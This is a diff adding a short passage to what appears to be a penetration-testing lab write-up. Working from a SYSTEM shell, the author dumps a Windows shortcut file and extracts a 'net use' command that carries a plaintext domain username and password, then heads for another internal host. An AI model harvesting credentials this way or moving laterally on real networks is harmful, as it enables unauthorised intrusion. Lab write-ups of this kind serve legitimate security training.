@@ -67,4 +67,19 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
+Looking at the backup file in the Admin directory where the flag was, had a backup file
 
+```
+C:\Users\Administrator\Desktop>type backups.lnk
+type backups.lnk
+�%System32V2�sN�% net.exe@�:i�+0�sN�%�R�Y.�8Wind`t�%�net.exeJ-I����C:\Windows\System32\net.exe!..\..\..\Windows\System32\net.exeC:\Windows\system326use X: \\dc01-phobos\backups /user:mrb3n W3lc0me123!!!�%�
+                  �wN���]N�D.��Q���`�Xws01-eris0�J2,D�羚��LW�1R�8���@PV�b�0�J2,D�羚��LW�1R�8���@PV�b�-	�Y1SPS�0��C�G����sf"=dSystem32 (C:\Windows)�1SPS�XF�L8C���&�m�i,S-1-5-21-358547233-633810918-1535616860-500�1SPS0�%��G���`���!
+net.exe@���
+           �)
+             Application@�����e1SPS�jc(=�����O��IC:\Windows\System32\net.exe91SPS�mD��pH�H@.�=x�hH��PxKG��I�SG��
+```
+```
+\dc01-phobos\backups /user:mrb3n W3lc0me123!!!
+```
+
+lets go look at 10.10.110.3
